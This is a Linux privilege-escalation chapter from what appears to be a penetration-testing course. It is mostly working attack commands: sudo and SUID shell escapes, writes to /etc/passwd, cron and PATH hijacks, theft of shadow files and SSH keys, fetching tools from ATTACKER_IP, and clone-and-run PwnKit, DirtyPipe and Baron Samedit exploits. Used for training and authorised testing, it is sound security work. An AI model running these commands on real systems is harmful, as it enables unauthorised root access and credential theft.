# 06.1 — Linux Privilege Escalation

## What Privilege Escalation Is

You have a shell as a low-privilege user. Privilege escalation (privesc) is the process of elevating that to root. On Linux, root UID=0 — full control over the system.

Two types:
- **Vertical** — low-privilege user → root
- **Horizontal** — user A → user B (same level, different account)

The methodology is always: **enumerate everything, identify misconfigurations, exploit the weakest link.**

---

## Initial Enumeration — The First 60 Seconds

Run these manually as soon as you get a shell. Before LinPEAS, before anything automated. Build situational awareness.

```bash
# Who am I?
id
whoami
groups

# What OS and kernel?
uname -a
cat /etc/os-release
cat /proc/version

# What other users exist?
cat /etc/passwd | grep -v "nologin\|false"    # users with shells

# What can I sudo?
sudo -l

# What SUID binaries exist?
find / -perm -4000 -type f 2>/dev/null

# What's in my home directory?
ls -la ~
cat ~/.bash_history
cat ~/.bashrc

# What network connections exist?
ss -tlnp
netstat -tlnp

# What's running?
ps aux
ps aux | grep root

# What cronjobs exist?
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# What are interesting files writable by me?
find / -writable -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null

# Mounted filesystems
mount
cat /etc/fstab

# Interesting files
cat /etc/shadow 2>/dev/null    # if readable = misconfiguration
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "id_rsa" -readable 2>/dev/null
find / -name "*.key" -readable 2>/dev/null
```

## Sudo Misconfiguration

### Check What You Can Run as Root

```bash
sudo -l
```

Common vulnerable output:

```
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/python3
(root) NOPASSWD: ALL
(ALL) NOPASSWD: /usr/bin/find
```

### GTFOBins — Exploit Sudo Permissions

GTFOBins (https://gtfobins.github.io) documents how to escalate privileges using common Unix binaries. For every binary you can sudo, check GTFOBins.

Common exploitable sudo binaries:

```bash
# vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'

# python / python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# less / more
sudo less /etc/passwd
# Once inside: !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (older versions with --interactive)
sudo nmap --interactive
nmap> !bash

# man
sudo man man
# Once inside: !/bin/bash

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# cat (read /etc/shadow if sudoable)
sudo cat /etc/shadow

# cp (overwrite /etc/passwd or /etc/sudoers)
echo "root2:$(openssl passwd -1 'newpass'):0:0:root:/root:/bin/bash" > /tmp/passwd
sudo cp /tmp/passwd /etc/passwd
su root2    # password: newpass

# env
sudo env /bin/bash

# bash
sudo bash

# ALL → immediate root
sudo /bin/bash
sudo su
```

### Sudo Version Vulnerabilities

```bash
sudo --version

# CVE-2021-3156 (Sudo Baron Samedit) — heap overflow → root
# Affects: sudo < 1.9.5p2
# Check: sudoedit -s /
# If error starts with "sudoedit:" not "usage:" → likely vulnerable

# CVE-2019-14287 — sudo bypass with user ID -1 or 4294967295
# sudo -u#-1 /bin/bash    (if allowed to run as specific user)
sudo -u#-1 /bin/bash
```

## SUID / SGID Binaries

### What SUID Is

When a binary has the SUID bit set, it runs as its **owner** (usually root) regardless of who executes it. If a SUID binary can be abused to run arbitrary commands, you get root.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries (run as the group owner)
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
```

### Identifying Non-Standard SUID Binaries

Standard SUID binaries on a clean system: `passwd`, `su`, `sudo`, `ping`, `mount`, `newgrp`. Anything else is suspicious.

```bash
# Compare against known-good list
find / -perm -4000 -type f 2>/dev/null | sort > suid_found.txt
# Anything not in the standard list = investigate
```

### Exploiting SUID Binaries (GTFOBins)

Check every non-standard SUID binary on GTFOBins.

```bash
# bash (if SUID set on bash — rare but happens)
/bin/bash -p    # -p = preserve effective UID (runs as root)

# cp (SUID) — overwrite sensitive files
cp /etc/passwd /tmp/passwd_backup
echo "attacker:$(openssl passwd -1 'pass'):0:0:root:/root:/bin/bash" >> /etc/passwd
su attacker

# find (SUID)
find . -exec /bin/bash -p \;

# vim (SUID)
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'

# python (SUID)
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# Custom SUID binary — check if it calls system() with relative path
strings /usr/local/bin/custom_suid_binary | grep -E "system|exec|PATH"
# If it calls e.g. 'service apache2 start' with relative path → PATH hijack
```

## PATH Hijacking

If a SUID binary or sudo command calls another program using a **relative path** (e.g., `service` instead of `/usr/sbin/service`), you can create a malicious binary with that name earlier in the PATH.

```bash
# Find relative path calls in SUID binary
strings /usr/local/bin/suid_binary
# Output includes: "service apache2 start"

# Create malicious 'service' binary
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Run the SUID binary — it calls /tmp/service instead of the real one
/usr/local/bin/suid_binary
# → root shell
```

## Cron Jobs

Cron jobs run scheduled commands, often as root. Misconfigured cron jobs are a common privesc path.

```bash
# Check all cron locations
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
cat /var/spool/cron/crontabs/root 2>/dev/null

# Watch for cron execution (pspy — see 06.3)
./pspy64    # monitor all processes without root
```

### Common Cron Misconfigurations

**1. World-writable script called by root cron:**

```bash
# Crontab: * * * * * root /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh    # if writable by you:
echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh
# Wait for cron to run it, then:
bash -p    # → root shell
```

**2. Script in a world-writable directory:**

```bash
# Crontab: * * * * * root /writable_dir/script.sh
# /writable_dir/ is writable by you:
echo '#!/bin/bash' > /writable_dir/script.sh
echo 'chmod +s /bin/bash' >> /writable_dir/script.sh
chmod +x /writable_dir/script.sh
# Wait for cron → bash -p
```

**3. Wildcard injection in cron:**

```bash
# Crontab: * * * * * root tar czf /backups/backup.tgz /var/www/*
# tar is called with wildcard — if you control /var/www/:
touch '/var/www/--checkpoint=1'
touch '/var/www/--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash' > /var/www/shell.sh
echo 'chmod +s /bin/bash' >> /var/www/shell.sh
chmod +x /var/www/shell.sh
# tar processes filenames starting with -- as flags → executes shell.sh as root
```

## Linux Capabilities

Capabilities are a fine-grained way to grant specific root privileges to processes without full root. Some capabilities can be abused for privesc.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities to look for
cap_setuid    # can set UID → run as root
cap_net_admin # network administration
cap_dac_read_search  # bypass file read permission checks
cap_sys_ptrace  # trace any process → memory read
```

### Exploiting cap_setuid

```bash
# If python3 has cap_setuid:
# /usr/bin/python3 = cap_setuid+ep

python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# → root shell
```

### Exploiting cap_dac_read_search

```bash
# If tar has cap_dac_read_search:
# Can read any file regardless of permissions

tar xf /etc/shadow -O    # read shadow file
```

## Writable /etc/passwd

If `/etc/passwd` is world-writable (rare but happens), add a root-level user:

```bash
# Check permissions
ls -la /etc/passwd

# Generate a password hash
openssl passwd -1 'hackedpass'
# → $1$...

# Add root user (UID 0)
echo 'attacker:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su attacker    # password: hackedpass
# → root shell
```

## NFS Misconfiguration

NFS (Network File System) shares configured with `no_root_squash` allow an attacker with root on their own machine to create SUID files that execute as root on the target.

```bash
# Check NFS exports on target
cat /etc/exports
showmount -e TARGET_IP    # from attacker machine

# If no_root_squash is present:
# /shared_folder *(rw,no_root_squash)

# Mount the share on your attacker machine (as root)
sudo mount -t nfs TARGET_IP:/shared_folder /tmp/nfs_mount

# Create SUID bash on the mount (as root on your machine)
sudo cp /bin/bash /tmp/nfs_mount/bash
sudo chmod +s /tmp/nfs_mount/bash

# On target, run the SUID bash
/shared_folder/bash -p
# → root shell (runs as root due to SUID + no_root_squash)
```

## Kernel Exploits

If everything else fails, kernel exploits elevate any user to root by exploiting vulnerabilities in the Linux kernel itself. Risky — can crash the system.

```bash
# Get kernel version
uname -r
# e.g. 4.4.0-116-generic

# Search for exploits
searchsploit linux kernel 4.4
searchsploit linux local privilege escalation 4.4

# Notable kernel exploits:
# Dirty COW (CVE-2016-5195) — kernels 2.6.22 to 4.8
# PwnKit (CVE-2021-4034) — pkexec local privesc (all major distros)
# DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
```

### PwnKit (CVE-2021-4034) — Most Reliable Modern Kernel Privesc

Works on virtually all Linux distributions regardless of kernel version if pkexec is installed.

```bash
# Check if pkexec exists
which pkexec
pkexec --version

# Download and compile PoC
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
# → root shell
```

### DirtyPipe (CVE-2022-0847)

```bash
# Check kernel version
uname -r    # 5.8 ≤ version ≤ 5.16.11

# Compile and run
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz::0:0::/root:/bin/bash
su ootz    # no password needed
# → root
```

## Spawning a TTY Shell

Many initial shells are non-interactive (no tab completion, no su, no sudo). Upgrade first.

```bash
# Python TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Script
script /dev/null -c bash

# After getting a basic TTY, fully upgrade:
Ctrl+Z                          # background the shell
stty raw -echo; fg              # fix terminal settings
reset                           # reset terminal
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116        # match your terminal size (check with: stty size)
```

## LinPEAS — Complete Guide

### What LinPEAS Is

**LinPEAS** = *Linux Privilege Escalation Awesome Script*. It's the Linux half of the **PEASS-ng** project (the Windows half is **WinPEAS**) maintained at [github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng). LinPEAS is a single bash script — no compilation, no dependencies beyond standard coreutils — that runs hundreds of checks for misconfigurations, weak permissions, sensitive files, kernel exploit indicators, and credential leaks. After your manual 60-second triage, this is the next thing you run.

### Getting It Onto The Target

Several reliable patterns. Pick whichever the egress firewall lets you do.

```bash
# Method 1 — direct download from GitHub (target has internet egress)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Method 2 — pipe straight to bash (no file written to disk)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Method 3 — host on attacker box, transfer
# On attacker:
cp /opt/linpeas.sh /var/www/html/
sudo systemctl start apache2          # or: python3 -m http.server 80

# On target:
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Method 4 — base64 paste (no network at all)
# On attacker: base64 -w0 linpeas.sh > linpeas.b64
# Paste into target shell:
echo '<base64_string>' | base64 -d > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Save output for later analysis
/tmp/linpeas.sh -a | tee /tmp/linpeas_full.txt        # -a = all checks (slow but exhaustive)
/tmp/linpeas.sh -q -o SysI,Devs > /tmp/linpeas.txt    # -q quiet (no banner), -o specific sections

# Avoid colour codes in saved output (cleaner for grep)
/tmp/linpeas.sh -N | tee /tmp/linpeas_plain.txt
```

### Useful Flags

| Flag | Effect |
|---|---|
| `-a` | All checks — runs the slow ones too (rsync, GitHub-hosted exploit DB checks). Default skips these. |
| `-s` | Stealth — skip noisy disk/file scans |
| `-N` | No colour output |
| `-q` | Quiet — no banner / progress |
| `-o LIST` | Run only the listed sections (`SysI`, `Devs`, `AvaSof`, `Net`, `UsrI`, `SofI`, `ProCron`, `IntFiles`, `API`, `CWA`) |
| `-e` | Extended scan — extra checks at higher noise level |
| `-h` | Help with full flag list |
| `-d IP/CIDR` | Run a host discovery on the local network (port scan-lite) |
| `-p PORT` | When discovery is on, target a specific port |

### Reading the Output — Colour Coding

This is the most important thing to internalise about LinPEAS. **Don't read top to bottom.** Jump straight to coloured findings.

| Colour | Meaning | What you do |
|---|---|---|
| 🟥 **Red text on yellow background** | **95%+ probability** of privesc. | This is the answer. Investigate first. |
| 🟥 **Red text** | High-importance finding worth reading | Investigate next. |
| 🟢 **Green text** | A check passed (this is *informational*, not a finding) | Skim |
| 🔵 **Blue text** | Informational — system / config data | Skim |
| 🟡 **Yellow text** | Interesting; manual triage needed | Investigate after red |

The script prints a legend in the banner at the top — re-read it the first time you run it. Many people miss the red-on-yellow vs plain-red distinction.

```bash
# After saving output, you can grep for the most likely vectors:
grep -E "(95%|99%)" /tmp/linpeas.txt        # explicit confidence markers
grep -i "writable" /tmp/linpeas.txt
grep -i "interesting" /tmp/linpeas.txt
grep -E "CVE-[0-9]+" /tmp/linpeas.txt       # kernel/exploit hits
```

### What LinPEAS Actually Checks

LinPEAS sections, mapped to what each finds and why it matters:

| Section | Checks | Privesc relevance |
|---|---|---|
| **System Information** | Kernel version, OS, distro, uptime | Match kernel against [kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits) and `searchsploit linux kernel <ver>`. Outdated kernel = potential PwnKit/DirtyPipe. |
| **Containers** | `/.dockerenv` file, `/proc/1/cgroup` patterns, namespace IDs | Lets you know you're in Docker/LXC/k8s — different escape paths apply (escape via privileged container, mounted Docker socket, capabilities like `SYS_ADMIN`). |
| **Cloud** | AWS/Azure/GCP IMDS reachability, instance metadata, IAM roles | If you can curl `169.254.169.254` you can steal AWS IAM creds → pivot into the AWS account. |
| **Network** | Active TCP/UDP listeners, ARP table, routes, `iptables` if readable, `/etc/hosts` | Find services bound to localhost only (often unauthenticated admin panels). The ARP table tells you who else is on the LAN — pivot targets. |
| **Users** | `/etc/passwd`, shells, last logins, `sudo -l` output, group memberships, `lastlog` | Identify accounts to spray, weak shells, sudo NOPASSWD entries. |
| **Software** | Installed packages with versions (`dpkg -l`, `rpm -qa`), running services | Run `searchsploit <pkg> <ver>` against anything interesting. Outdated apache/mysql/openssh often → known CVE. |
| **Processes** | `ps -ef` snapshot, processes running as root, command-lines | Look for root processes calling user-writable scripts. Use `pspy64` for live monitoring. |
| **Cron / systemd timers** | `/etc/crontab`, `/etc/cron.*`, user crontabs, `systemctl list-timers` | Writable scripts/binaries called by root cron = direct privesc. |
| **SUID / SGID** | `find / -perm -4000`, `find / -perm -2000` | Cross-reference with [GTFOBins](https://gtfobins.github.io). Custom SUID binaries deserve `strings` + reverse engineering. |
| **Capabilities** | `getcap -r /` | `cap_setuid+ep` on python, ruby, perl, node, gdb, php → trivial escalation. |
| **NFS** | `/etc/exports` content, mounted NFS shares | `no_root_squash` → SUID binary trick (covered above). |
| **SSH** | Authorized_keys, known_hosts, private keys in home dirs, ssh-agent sockets, ssh config | Find pivot targets, agent hijack, persistent backdoor opportunities. |
| **Passwords** | Greps for `password=`, `secret=`, `pwd=`, `*-private*`, `id_rsa`, `*.kdbx`, `.env`, `.git/config`, browser saved passwords (Chrome/Firefox) | Flat-text creds in config files are still depressingly common. |
| **Software-specific config** | mysql `--user=root`, postgres trust auth, redis no-auth, mongodb no-auth, screen/tmux sockets | Service-level misconfigs that hand you root via the service. |

### Manual Verification — Walking The Top Findings

LinPEAS finds a lot. Each red finding still requires you to manually verify and exploit. Templates for the most common ones:

```bash
# --- SUID custom binary ---
# Output: -rwsr-xr-x 1 root root /usr/local/bin/customtool
file /usr/local/bin/customtool
strings /usr/local/bin/customtool | grep -E "system|exec|popen|/bin/|/usr/"
ltrace /usr/local/bin/customtool 2>&1 | head -50    # see what it calls dynamically
# If it calls a relative path → PATH hijack
# If it reads /etc/something configurable → check that path's permissions

# --- Writable cron script ---
# Output: -rwxrwxrwx 1 root root /opt/scripts/backup.sh   [crontab: * * * * * root /opt/scripts/backup.sh]
echo 'chmod u+s /bin/bash' >> /opt/scripts/backup.sh
# wait one cycle
ls -la /bin/bash       # confirm SUID set
/bin/bash -p           # → euid=0

# --- Writable systemd service file ---
# Output: -rw-rw-rw- /etc/systemd/system/somesvc.service   [calls a binary as root]
sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c "chmod u+s /bin/bash"|' /etc/systemd/system/somesvc.service
systemctl daemon-reload
systemctl restart somesvc

# --- Sudo NOPASSWD on a known GTFOBins binary ---
# Output: User foo may run the following commands on host:
#   (root) NOPASSWD: /usr/bin/find
sudo /usr/bin/find . -exec /bin/sh -p \; -quit

# --- Capabilities (cap_setuid on python) ---
# Output: /usr/bin/python3.10 = cap_setuid+ep
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# --- SSH private key in /home/ ---
# Output: /home/dev/.ssh/id_rsa is readable
cat /home/dev/.ssh/id_rsa
# On attacker:
chmod 600 stolen_key
ssh -i stolen_key dev@target

# --- Plaintext password in config ---
# Output: /var/www/html/wp-config.php contains DB_PASSWORD = 'Pa$$w0rd!'
mysql -u root -p'Pa$$w0rd!' -e 'select user,authentication_string from mysql.user;'
# Then try this password on root, or on other accounts (password reuse)
su root           # often the first thing to try
```

### When LinPEAS Misses Things

LinPEAS is excellent but not omniscient. It can be:

- **Killed by EDR** — if it's blocked, fall back to manual checks or use **linenum** (smaller footprint), **les** (linux-exploit-suggester), or **pspy64** for live process monitoring.
- **Tricked by chroot/containers** — if you're in a container, host-level findings don't all apply. Verify with `cat /proc/1/cgroup` and treat container escape as a separate workflow.
- **Outdated** for *very* recent CVEs — if you hit a 2025/2026 disclosure, manually check kernel and software versions against current advisories.

```bash
# Alternative privesc enumerators worth keeping in your toolkit:
# linenum
git clone https://github.com/rebootuser/LinEnum
./LinEnum.sh -t -k password -r report.txt

# linux-exploit-suggester (kernel-focused)
./linux-exploit-suggester.sh                      # auto-detects kernel
./linux-exploit-suggester.sh --uname '5.4.0-100-generic'   # check a specific kernel

# linux-smart-enumeration (LSE) — quieter, level-based output
./lse.sh -l 2                                     # level 2 = most useful info

# pspy64 — live process monitoring, reveals cron jobs and timed tasks
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

## Linux Kernel Exploits — Reference

Kernel exploits are the *last resort* of privesc. They have collateral risks: they may panic the kernel and reboot the box, they're often easy to detect (EDR hooks `kallsyms` access patterns), and they may not be reliable across patches. Use them when no other vector exists.

### Triage Order

1. `uname -a` — get the exact kernel version and architecture.
2. `cat /etc/os-release` — distro-specific patches matter (Ubuntu, RHEL, and Debian backport differently).
3. Run `linux-exploit-suggester.sh` first.
4. Cross-reference with `searchsploit linux kernel <maj>.<min>` and the `kernel-exploits` GitHub repo.
5. Always test in a snapshot/lab matching the target before live use.

### Notable Kernel & Userland-Privileged Vulnerabilities

| CVE | Name | Affects | Mechanism | Reliability |
|---|---|---|---|---|
| **CVE-2016-5195** | Dirty COW | Linux ≤ 4.8.3 | Race condition in copy-on-write of `MAP_PRIVATE` mappings of read-only files. Win the race → write to read-only files (e.g. `/etc/passwd` or a SUID binary). | Reliable on vulnerable kernels; needs compile-on-target or matching arch. |
| **CVE-2017-1000112** | UDP frag race | 2.6.x – 4.13 | Memory corruption via UDP fragmentation reassembly | Less common today |
| **CVE-2019-14287** | sudo `-u#-1` | sudo < 1.8.28 | Logic bug: `runas_user_id = -1` was accepted and treated as root, bypassing the user restriction | Rare in modern repos but worth checking |
| **CVE-2021-3156** | Sudo Baron Samedit | sudo < 1.9.5p2 | Heap-based buffer overflow in `sudoedit` argv parsing — escapes single-character `\` at end of `-s` argument | High; even non-sudoers can trigger if `sudoedit` is callable |
| **CVE-2021-4034** | PwnKit | All distros with polkit (almost all) | `pkexec` can be invoked with `argv[0]=NULL`; the resulting NULL-pointer-dereferenced argv parsing reads from `envp` and writes attacker-controlled env back to argv → arbitrary `setenv` from a SUID-root binary → LD_PRELOAD or CHARSET injection → root | **Extremely reliable**, near-universal applicability, fast — go-to modern Linux privesc |
| **CVE-2022-0847** | DirtyPipe | Linux 5.8 – 5.16.10 (5.15.25, 5.10.102, 5.16.11 patched) | Pipe `pipe_buffer` flags initialisation bug allows writing into the page cache of files the user has only read access to → overwrite read-only files (SUID binary, `/etc/passwd`) | Very reliable; compiled in seconds |
| **CVE-2023-32233** | Netfilter nf_tables UAF | 6.x kernels | Use-after-free in nf_tables → root | Still emerging |
| **CVE-2024-1086** | nf_tables double-free | up to 6.6, 6.4 patched | Notable late-2024 nf_tables exploitation primitive | Modern, reliable |

### PwnKit — The Universal Modern Linux Privesc

```bash
# Detect
which pkexec && stat -c '%a %n' "$(which pkexec)"      # SUID bit set on pkexec?
pkexec --version                                       # any version < 0.121 vulnerable
ls -la /usr/lib/policykit-1/polkit-agent-helper-1 2>/dev/null

# Exploit (Berdav PoC — the cleanest)
git clone https://github.com/berdav/CVE-2021-4034 /tmp/pwnkit
cd /tmp/pwnkit
make
./cve-2021-4034
# whoami → root

# When you can't compile on target — pre-built binaries
# Drop the binary via the same transfer methods used for linpeas
chmod +x cve-2021-4034
./cve-2021-4034
```

PwnKit is the answer for the vast majority of unpatched Linux boxes you'll see in CTFs and many enterprise environments through 2022–2024 patch cycles.

### DirtyPipe — Quick Path to SUID Hijack

```bash
# Detect
uname -r            # need 5.8 ≤ ver < 5.16.11 (and patch level dependent)

# Exploit — overwrite SUID binary (e.g. /usr/bin/su) to launch a root shell
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits /tmp/dp
cd /tmp/dp
bash compile.sh
./exploit-1                # uses /etc/passwd path
./exploit-2 /usr/bin/sudo  # hijack a SUID binary path
```

The original Max Kellermann PoC overwrites a chosen SUID binary with attacker shellcode embedded in the file's page cache. After exploitation, simply running the SUID binary spawns a root shell.

### Sudo Baron Samedit — When Sudo Is Old

```bash
# Detect
sudoedit -s '\' $(printf '%-1000s' '\\\\\\\\\\\\\\\\')
# If "sudoedit:" prefix instead of "usage:" → vulnerable

# Exploit (Blasty's PoC is the most reliable)
git clone https://github.com/blasty/CVE-2021-3156 /tmp/bs
cd /tmp/bs
make
./sudo-hax-me-a-sandwich        # auto-detects target, picks the right offset
./sudo-hax-me-a-sandwich 0      # specific offset variant
# whoami → root
```

### CVE-2019-14287 — sudo `-u#-1`

```bash
# Look for
sudo -l
# Output like:
# (ALL, !root) NOPASSWD: /bin/bash    # explicitly forbids root — but allows ALL non-root users

# Exploit (any sudoers entry that allows running commands as a non-root user)
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash       # equivalent — uid wrap
# → root
```

### General Notes on Kernel Exploits

- **Always have a stable revert path.** If the exploit panics the kernel, you may lose your foothold permanently. Coordinate with the engagement contact before running on production.
- **Avoid in production engagements when there's a cleaner path.** PwnKit on a heavily-monitored box still leaves a trail (audit, EDR). A misconfigured SUID with GTFOBins is invisible by comparison.
- **Compile on a matching kernel.** Static-link or compile on a similar version + arch when possible. Many privesc PoCs embed offsets/structures that change subtly across kernels.
- **Document everything in your report** — exploit name, CVE, kernel version, source PoC URL, commit hash, time of execution. Defenders will need this for IR, and the customer will appreciate the clarity.
